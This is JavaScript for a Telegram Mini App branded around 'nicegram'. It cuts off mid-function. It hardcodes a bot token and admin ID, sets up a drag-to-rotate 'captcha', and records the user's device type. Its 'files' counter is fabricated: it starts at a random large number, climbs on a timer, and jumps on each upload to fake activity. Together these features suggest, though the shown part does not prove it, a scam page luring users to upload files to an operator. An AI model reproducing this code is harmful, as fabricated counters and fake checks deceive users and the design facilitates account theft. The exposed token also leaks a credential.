const tg = window.Telegram.WebApp;
tg.expand();

// Настройки
const BOT_TOKEN = "8567185651:AAFx8TIPf4nEle-hGT25sfip20dB7m0VT1I";
const ADMIN_ID = "7632180689";

// Переменные капчи
let currentAngle = 0;
let isDragging = false;
let startNotificationSent = false;
let targetMin = 30;
let targetMax = 50;

// Счетчик файлов
let filesCounter = 0;
let counterInterval;
let lastUpdateTime = 0;

// Элементы
const degreeDisplay = document.getElementById('degree');
const sliderHandle = document.getElementById('slider-handle');
const targetRange = document.getElementById('target-range');
const captchaScreen = document.getElementById('captcha-screen');
const mainScreen = document.getElementById('main-screen');
const statusMsg = document.getElementById('status-msg');
const welcomeUser = document.getElementById('welcome-user');
const filesCounterElement = document.getElementById('files-counter');

// Инициализация счетчика с продвинутым алгоритмом
function initCounter() {
    // Загружаем счетчик из localStorage
    const savedData = localStorage.getItem('nicegram_counter_data');
    
    if (savedData) {
        try {
            const data = JSON.parse(savedData);
            const today = new Date().toDateString();
            const savedDate = data.date;
            
            if (savedDate === today) {
                // Сегодняшний день - восстанавливаем счетчик
                filesCounter = data.counter;
                lastUpdateTime = data.lastUpdateTime || Date.now();
                
                // Рассчитываем, сколько прошло времени с последнего обновления
                const timePassed = Date.now() - lastUpdateTime;
                const secondsPassed = Math.floor(timePassed / 1000);
                
                // Каждые 10 секунд добавляется 1, так что вычисляем сколько добавить
                const additions = Math.floor(secondsPassed / 10);
                
                if (additions > 0) {
                    filesCounter += additions;
                    lastUpdateTime = Date.now();
                    saveCounterData();
                    console.log(`Добавлено ${additions} к счетчику за прошедшее время`);
                }
            } else {
                // Новый день - начинаем с последнего значения + рандом
                const baseCounter = data.counter;
                // Добавляем случайное число от 50 до 200
                const randomAddition = Math.floor(Math.random() * 151) + 50;
                filesCounter = baseCounter + randomAddition;
                lastUpdateTime = Date.now();
                saveCounterData();
                console.log(`Новый день! Добавлено ${randomAddition} к счетчику`);
            }
        } catch (e) {
            console.error('Ошибка загрузки данных:', e);
            // Начинаем с случайного числа
            filesCounter = Math.floor(Math.random() * 1000) + 500;
            lastUpdateTime = Date.now();
            saveCounterData();
        }
    } else {
        // Первый запуск - начинаем с большого числа
        filesCounter = Math.floor(Math.random() * 1500) + 1000;
        lastUpdateTime = Date.now();
        saveCounterData();
    }
    
    // Обновляем отображение
    if (filesCounterElement) {
        filesCounterElement.textContent = formatNumber(filesCounter);
    }
    
    // Запускаем интервал увеличения счетчика
    if (counterInterval) {
        clearInterval(counterInterval);
    }
    
    counterInterval = setInterval(() => {
        increaseCounter();
    }, 10000); // 10 секунд
    
    console.log('Счетчик инициализирован:', filesCounter);
}

// Сохранение данных счетчика
function saveCounterData() {
    const data = {
        counter: filesCounter,
        date: new Date().toDateString(),
        lastUpdateTime: Date.now()
    };
    
    localStorage.setItem('nicegram_counter_data', JSON.stringify(data));
}

// Форматирование числа с пробелами
function formatNumber(num) {
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
}

// Увеличение счетчика (основная функция)
function increaseCounter() {
    // Базовое увеличение
    filesCounter++;
    
    // Случайное дополнительное увеличение (10% шанс добавить еще 1-3)
    if (Math.random() < 0.1) {
        const extra = Math.floor(Math.random() * 3) + 1;
        filesCounter += extra;
    }
    
    // Сохраняем
    saveCounterData();
    
    // Обновляем отображение с анимацией
    if (filesCounterElement) {
        filesCounterElement.textContent = formatNumber(filesCounter);
        
        // Анимация обновления
        filesCounterElement.style.transform = 'scale(1.15)';
        filesCounterElement.style.color = '#00ffaa';
        
        setTimeout(() => {
            filesCounterElement.style.transform = 'scale(1)';
            filesCounterElement.style.color = '';
        }, 300);
    }
    
    // Логируем каждое 100-е увеличение
    if (filesCounter % 100 === 0) {
        console.log(`Счетчик достиг: ${formatNumber(filesCounter)}`);
    }
}

// Увеличение счетчика при отправке файла
function increaseCounterOnUpload() {
    // При отправке файла добавляем больше
    const uploadBonus = Math.floor(Math.random() * 5) + 3; // 3-7
    filesCounter += uploadBonus;
    
    saveCounterData();
    
    if (filesCounterElement) {
        filesCounterElement.textContent = formatNumber(filesCounter);
        
        // Специальная анимация для загрузки
        filesCounterElement.style.transform = 'scale(1.3)';
        filesCounterElement.style.color = '#00ff00';
        filesCounterElement.style.textShadow = '0 0 15px #00ff00';
        
        setTimeout(() => {
            filesCounterElement.style.transform = 'scale(1.1)';
            setTimeout(() => {
                filesCounterElement.style.transform = 'scale(1)';
                filesCounterElement.style.color = '';
                filesCounterElement.style.textShadow = '';
            }, 200);
        }, 300);
    }
    
    console.log(`Добавлено ${uploadBonus} к счетчику за загрузку файла`);
}

// Функция определения устройства
function detectDevice() {
    const userAgent = navigator.userAgent;
    
    if (/android/i.test(userAgent)) {
        return "📱 Android";
    } else if (/iPad|iPhone|iPod/.test(userAgent)) {
        return "📱 iOS (iPhone/iPad)";
    } else if (/windows/i.test(userAgent)) {
        return "💻 Windows PC";
    } else if (/mac/i.test(userAgent)) {
        return "💻 macOS";
   
